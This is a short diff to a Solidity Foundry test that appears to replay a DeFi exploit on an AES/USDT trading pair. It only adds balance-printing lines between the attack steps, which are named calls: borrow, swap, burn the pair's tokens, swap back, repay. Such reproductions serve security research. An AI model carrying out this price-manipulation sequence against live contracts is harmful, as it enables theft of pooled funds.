@@ -247,7 +247,9 @@ contract AESTest is Test, BlockLoader {
         vm.startPrank(attacker);
         vm.assume(amt6 >= amt0);
         borrow_usdt_owner(amt0);
+        printBalance("after step0");
         swap_pair_attacker_usdt_aes(amt1, amt2);
+        printBalance("after step1");
         burn_aes_pair(amt3);
         swap_pair_attacker_aes_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
